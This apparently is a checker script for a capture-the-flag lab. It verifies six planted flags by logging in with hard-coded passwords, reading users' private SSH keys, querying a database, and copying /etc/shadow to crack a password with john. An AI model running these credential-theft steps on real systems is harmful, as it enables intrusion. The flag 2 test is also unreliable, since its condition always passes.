#!/usr/bin/env bash

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )

# Flag 1
echo "Flag #1: Dev password on internal website"
echo "  [!] Flag #1 test not implemented"

# Flag 2
echo "Flag #2: Camera image"

curl http://172.16.10.224/feed.jpg -o /tmp/camera 2> /dev/null
diff /tmp/camera "$SCRIPT_DIR/../volumes/cameras/feed_2.jpg" > /dev/null

if [ $? ]; then
    echo "  [*] Able to retrieve flag #2"
else
    echo "  [!] Could not find flag #2, or the image does not match the expected one"
fi

# Flag 3
echo "Flag #3: Alice's laptop"
echo "  [!] Flag #3 test not implemented"

# Flag 4
echo "Flag #4: Private key files"

FLAG4="{flag4-pr1v4tek3y}"

if [[ $(sshpass -p "{flag3-Sw0rdf1sh}" ssh alice@172.16.10.4 cat .ssh/id_rsa) != "$FLAG4" ]]; then
    echo "  [!] Alice has incorrect flag #4"
elif [[ $(sshpass -p "{flag2-L33T}" ssh bob@172.16.10.4 cat .ssh/id_rsa) != "$FLAG4" ]]; then
    echo "  [!] Bob has incorrect flag #4"
elif [[ $(sshpass -p "letmein" ssh carol@172.16.10.4 cat .ssh/id_rsa) != "$FLAG4" ]]; then
    echo "  [!] Carol has incorrect flag #4"
else
    echo "  [*] Everyone has correct flags"
fi

# Flag 5
echo "Flag #5: Postgresql database"
FLAG5="{flag5-y1k3s}"
PGPASSWORD="{flag1-internal-use-only}" psql -h 172.16.10.6 -U dev -d sales < ./read_flag.sql | grep "$FLAG5" > /dev/null
dev=$?
PGPASSWORD="{flag3-Sw0rdf1sh}" psql -h 172.16.10.6 -U alice -d sales < ./read_flag.sql | grep "$FLAG5" > /dev/null
alice=$?
PGPASSWORD="{flag2-L33T}" psql -h 172.16.10.6 -U bob -d sales < ./read_flag.sql | grep "$FLAG5" > /dev/null
bob=$?
PGPASSWORD="letmein" psql -h 172.16.10.6 -U carol -d sales < ./read_flag.sql | grep "$FLAG5" > /dev/null
carol=$?

if [[ "$dev" != "0" ]]; then
    echo "  [!] Dev cannot access flag #5"
elif [[ "$alice" != "0" ]]; then
    echo "  [!] Alice cannot access flag #5"
elif [[ "$bob" != "0" ]]; then
    echo "  [!] Bob cannot access flag #5"
elif [[ "$carol" != "0" ]]; then
    echo "  [!] Carol cannot access flag #5"
else
    echo "  [*] Everyone is able to access flag #5"
fi

# Flag 6
echo "Flag #6: Carol brute-force"

sshpass -p "{flag3-Sw0rdf1sh}" scp alice@172.16.10.4:/etc/shadow .
rm ~/.john/john.pot 2> /dev/null
timeout 1 john --users=carol --wordlist=wordlist.lst shadow 2> /dev/null | grep letmein > /dev/null

if [[ "$?" != "0" ]]; then
    echo "  [!] Did not immidiately brute-force Carol's password"
else
    echo "  [*] Able to download and brute-force Carol's password"
fi

rm ./shadow